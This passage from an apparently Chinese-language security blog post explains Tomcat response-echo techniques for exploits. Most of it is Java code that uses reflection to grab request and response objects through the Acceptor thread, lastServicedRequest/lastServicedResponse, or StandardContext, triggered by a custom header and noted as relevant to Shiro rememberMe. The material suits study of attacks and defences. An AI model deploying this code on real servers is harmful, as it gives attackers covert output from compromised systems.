+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.example.web</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServlet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Iterator</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">goodServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doPost</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">Tomcat6789</span> <span class="n">aa</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Tomcat6789</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">class</span> <span class="nc">Tomcat6789</span> <span class="o">{</span>
+        <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getField</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">Field</span> <span class="n">declaredField</span><span class="o">;</span>
+            <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">object</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
+            <span class="k">while</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">try</span> <span class="o">{</span>
+
+                    <span class="n">declaredField</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+                    <span class="n">declaredField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                    <span class="k">return</span> <span class="n">declaredField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="o">}</span>
+                <span class="n">clazz</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="kd">public</span> <span class="n">Object</span> <span class="nf">GetAcceptorThread</span><span class="o">()</span> <span class="o">{</span>
+            <span class="c1">//获取当前所有线程
+</span><span class="c1"></span>            <span class="n">Thread</span><span class="o">[]</span> <span class="n">threads</span> <span class="o">=</span> <span class="o">(</span><span class="n">Thread</span><span class="o">[])</span> <span class="k">this</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getThreadGroup</span><span class="o">(),</span> <span class="s">&#34;threads&#34;</span><span class="o">);</span>
+            <span class="c1">//从线程组中找到Acceptor所在的线程 在tomcat6中的格式为:Http-端口-Acceptor
+</span><span class="c1"></span>            <span class="k">for</span> <span class="o">(</span><span class="n">Thread</span> <span class="n">thread</span> <span class="o">:</span> <span class="n">threads</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">thread</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">continue</span><span class="o">;</span>
+                <span class="o">}</span>
+                <span class="k">if</span> <span class="o">((</span><span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Acceptor&#34;</span><span class="o">))</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;http&#34;</span><span class="o">)))</span> <span class="o">{</span>
+                    <span class="n">Object</span> <span class="n">target</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">thread</span><span class="o">,</span> <span class="s">&#34;target&#34;</span><span class="o">);</span>
+                    <span class="k">if</span> <span class="o">(!(</span><span class="n">target</span> <span class="k">instanceof</span> <span class="n">Runnable</span><span class="o">))</span> <span class="o">{</span>
+                        <span class="k">try</span> <span class="o">{</span>
+                            <span class="n">Object</span> <span class="n">target2</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">thread</span><span class="o">,</span> <span class="s">&#34;this$0&#34;</span><span class="o">);</span>
+                            <span class="n">target</span> <span class="o">=</span> <span class="n">thread</span><span class="o">;</span>
+                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                            <span class="k">continue</span><span class="o">;</span>
+                        <span class="o">}</span>
+                    <span class="o">}</span>
+                    <span class="n">Object</span> <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">&#34;this$0&#34;</span><span class="o">);</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">jioEndPoint</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="k">try</span> <span class="o">{</span>
+                            <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">&#34;endpoint&#34;</span><span class="o">);</span>
+                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                            <span class="k">continue</span><span class="o">;</span>
+                        <span class="o">}</span>
+                    <span class="o">}</span>
+                    <span class="k">return</span> <span class="n">jioEndPoint</span><span class="o">;</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="kd">public</span> <span class="nf">Tomcat6789</span><span class="o">()</span> <span class="o">{</span>
+            <span class="n">Object</span> <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">GetAcceptorThread</span><span class="o">();</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">jioEndPoint</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="n">Object</span> <span class="n">object</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">jioEndPoint</span><span class="o">,</span> <span class="s">&#34;handler&#34;</span><span class="o">),</span> <span class="s">&#34;global&#34;</span><span class="o">);</span>
+            <span class="c1">//从找到的Acceptor线程中获取请求域名、请求的路径
+</span><span class="c1"></span>            <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span> <span class="n">processors</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">object</span><span class="o">,</span> <span class="s">&#34;processors&#34;</span><span class="o">);</span>
+            <span class="n">Iterator</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">processors</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
+            <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+                <span class="n">Object</span> <span class="n">next</span> <span class="o">=</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+                <span class="n">Object</span> <span class="n">req</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">next</span><span class="o">,</span> <span class="s">&#34;req&#34;</span><span class="o">);</span>
+                <span class="n">Object</span> <span class="n">serverPort</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="s">&#34;serverPort&#34;</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">serverPort</span><span class="o">.</span><span class="na">equals</span><span class="o">(-</span><span class="n">1</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">continue</span><span class="o">;</span>
+                <span class="o">}</span>
+                <span class="c1">//通过自定义header ，通过获取header来判断指定的request对象
+</span><span class="c1"></span>                <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="o">((</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">coyote</span><span class="o">.</span><span class="na">Request</span><span class="o">)</span> <span class="n">req</span><span class="o">).</span><span class="na">getHeader</span><span class="o">(</span><span class="s">&#34;yougood&#34;</span><span class="o">);</span>
+                <span class="c1">//获得org.apache.catalina.connector.Request对象
+</span><span class="c1"></span>                <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span><span class="o">)</span> <span class="o">((</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">coyote</span><span class="o">.</span><span class="na">Request</span><span class="o">)</span> <span class="n">req</span><span class="o">).</span><span class="na">getNote</span><span class="o">(</span><span class="n">1</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">s</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Response</span> <span class="n">response</span> <span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="na">getResponse</span><span class="o">();</span>
+                    <span class="k">try</span> <span class="o">{</span>
+                        <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;aa&#34;</span><span class="o">));</span>
+                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+                    <span class="o">}</span>
+
+                   <span class="cm">/*//或者利用org.apache.coyote.Response 回显
+</span><span class="cm">                    org.apache.coyote.Response response = (org.apache.coyote.Response) getField(req, &#34;response&#34;);
+</span><span class="cm">                    ByteChunk byte1 = new ByteChunk();
+</span><span class="cm">                    byte1.setBytes(xxx.getBytes(StandardCharsets.UTF_8), 0, xxx.length());
+</span><span class="cm">                    try {
+</span><span class="cm">                        response.doWrite(byte1);
+</span><span class="cm">                    } catch (IOException e) {
+</span><span class="cm">                        e.printStackTrace();
+</span><span class="cm">                    }*/</span>
+<span class="cm">/*                  tomcat 9回显方式
+</span><span class="cm">                    ByteBuffer byte2=ByteBuffer.wrap(xxx.getBytes(StandardCharsets.UTF_8));
+</span><span class="cm">                    try {
+</span><span class="cm">                        response.doWrite(byte2);
+</span><span class="cm">                    } catch (IOException ex) {
+</span><span class="cm">                        ex.printStackTrace();
+</span><span class="cm">                    }*/</span>
+
+                <span class="o">}</span>
+
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>利用lastServicedRequest和lastServicedResponse</p>
+<p>这两个都是静态变量。在<code>ApplicationFilterChain#internalDoFilter</code>中，当<code>WRAP_SAME_OBJECT</code>为 true 时会调用ThreadLocal的set函数将request和response存放进去（tomcat6是<code>STRICT_SERVLET_COMPLIANCE</code>）。</p>
+<p><img src="/images/image-20211031170807.png" alt=""></p>
+<p>可以利用反射来修改<code>WRAP_SAME_OBJECT</code>为 true ，同时初始化lastServicedRequest和lastServicedResponse变量为ThreadLocal对象。第一次访问时通过反射修改并初始化这三个参数，第二次访问时获取参数即可。</p>
+<p><strong>代码实现（适用于Tomcat6、7、8、9）</strong></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="k">try</span> <span class="o">{</span>
+     <span class="n">Field</span> <span class="n">wrap_same_object</span> <span class="o">=</span><span class="kc">null</span><span class="o">;</span>
+     <span class="k">try</span><span class="o">{</span>
+         <span class="n">wrap_same_object</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.catalina.core.ApplicationDispatcher&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;WRAP_SAME_OBJECT&#34;</span><span class="o">);</span>
+     <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+         <span class="c1">//tomcat6 修改STRICT_SERVLET_COMPLIANCE变量
+</span><span class="c1"></span>         <span class="n">wrap_same_object</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.catalina.Globals&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;STRICT_SERVLET_COMPLIANCE&#34;</span><span class="o">);</span>
+     <span class="o">}</span>
+     <span class="n">Field</span> <span class="n">lastServicedRequest</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;lastServicedRequest&#34;</span><span class="o">);</span>
+     <span class="n">Field</span> <span class="n">lastServicedResponse</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;lastServicedResponse&#34;</span><span class="o">);</span>
+     <span class="n">lastServicedRequest</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+     <span class="n">lastServicedResponse</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+     <span class="n">wrap_same_object</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+     <span class="c1">//修改final
+</span><span class="c1"></span>     <span class="n">Field</span> <span class="n">modifiersField</span> <span class="o">=</span> <span class="n">Field</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;modifiers&#34;</span><span class="o">);</span>
+     <span class="n">modifiersField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+     <span class="n">modifiersField</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="n">wrap_same_object</span><span class="o">,</span> <span class="n">wrap_same_object</span><span class="o">.</span><span class="na">getModifiers</span><span class="o">()</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">Modifier</span><span class="o">.</span><span class="na">FINAL</span><span class="o">);</span>
+     <span class="n">modifiersField</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="n">lastServicedRequest</span><span class="o">,</span> <span class="n">lastServicedRequest</span><span class="o">.</span><span class="na">getModifiers</span><span class="o">()</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">Modifier</span><span class="o">.</span><span class="na">FINAL</span><span class="o">);</span>
+     <span class="n">modifiersField</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="n">lastServicedResponse</span><span class="o">,</span> <span class="n">lastServicedResponse</span><span class="o">.</span><span class="na">getModifiers</span><span class="o">()</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">Modifier</span><span class="o">.</span><span class="na">FINAL</span><span class="o">);</span>
+     <span class="kt">boolean</span> <span class="n">wrap_same_object1</span> <span class="o">=</span> <span class="n">wrap_same_object</span><span class="o">.</span><span class="na">getBoolean</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+     <span class="n">ThreadLocal</span><span class="o">&lt;</span><span class="n">ServletRequest</span><span class="o">&gt;</span> <span class="n">requestThreadLocal</span> <span class="o">=</span> <span class="o">(</span><span class="n">ThreadLocal</span><span class="o">&lt;</span><span class="n">ServletRequest</span><span class="o">&gt;)</span><span class="n">lastServicedRequest</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+     <span class="n">ThreadLocal</span><span class="o">&lt;</span><span class="n">ServletResponse</span><span class="o">&gt;</span> <span class="n">responseThreadLocal</span> <span class="o">=</span> <span class="o">(</span><span class="n">ThreadLocal</span><span class="o">&lt;</span><span class="n">ServletResponse</span><span class="o">&gt;)</span><span class="n">lastServicedResponse</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+     <span class="k">if</span> <span class="o">(!</span><span class="n">wrap_same_object1</span> <span class="o">&amp;&amp;</span> <span class="n">requestThreadLocal</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">responseThreadLocal</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
+         <span class="n">wrap_same_object</span><span class="o">.</span><span class="na">setBoolean</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="kc">true</span><span class="o">);</span>
+         <span class="n">lastServicedRequest</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="k">new</span> <span class="n">ThreadLocal</span><span class="o">&lt;&gt;());</span>
+         <span class="n">lastServicedResponse</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="k">new</span> <span class="n">ThreadLocal</span><span class="o">&lt;&gt;());</span>
+     <span class="o">}</span><span class="k">else</span><span class="o">{</span>
+         <span class="n">ServletResponse</span> <span class="n">servletResponse</span> <span class="o">=</span> <span class="n">responseThreadLocal</span><span class="o">.</span><span class="na">get</span><span class="o">();</span>
+         <span class="n">servletResponse</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">&#34;111&#34;</span><span class="o">);</span>
+     <span class="o">}</span>
+ <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+     <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+ <span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><strong>注：</strong> Shiro不能用该方法获取Response，因为rememberMe的实现使用了自己实现的filter。<code>request、response</code>的设置是在漏洞触发点之后。</p>
+</li>
+<li>
+<p>Tomcat 8、9版本可以通过StrandContext获取到Resquest、Response对象。如图</p>
+<p><img src="/images/image-20211031170901.png" alt=""></p>
+<p><strong>代码实现</strong></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">loader</span><span class="o">.</span><span class="na">WebappClassLoaderBase</span> 						<span class="n">webappClassLoaderBase</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">loader</span><span class="o">.</span><span class="na">WebappClassLoaderBase</span><span class="o">)</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
+<span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">webappClassLoaderBase</span><span class="o">.</span><span class="na">getResources</span><span class="o">().</span><span class="na">getContext</span><span class="o">();</span>
+<span class="k">try</span> <span class="o">{</span>
+ <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+ <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+ <span class="n">ApplicationContext</span> <span class="n">ApplicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">standardContext</span><span class="o">);</span>
+ <span class="n">Field</span> <span class="n">service</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;service&#34;</span><span class="o">);</span>
+ <span class="n">service</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+ <span class="n">StandardService</span> <span class="n">standardService</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardService</span><span class="o">)</span> <span class="n">service</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">ApplicationContext</span><span class="o">);</span>
+
+ <span class="n">Field</span> <span class="n">connectors</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.catalina.core.StandardService&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;connectors&#34;</span><span class="o">);</span>
+ <span class="n">connectors</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+ <span class="n">Connector</span><span class="o">[]</span> <span class="n">connector</span> <span class="o">=</span> <span class="o">(</span><span class="n">Connector</span><span class="o">[])</span> <span class="n">connectors</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">standardService</span><span class="o">);</span>
+
+ <span class="n">Field</span> <span class="n">protocolHandler</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.catalina.connector.Connector&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;protocolHandler&#34;</span><span class="o">);</span>
+ <span class="n">protocolHandler</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+ <span class="n">AbstractProtocol</span> <span class="n">abstractProtocol</span> <span class="o">=</span> <span class="o">(</span><span class="n">AbstractProtocol</span><span class="o">)</span> <span class="n">protocolHandler</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">connector</span><span class="o">[</span><span class="n">0</span><span class="o">]);</span>
+
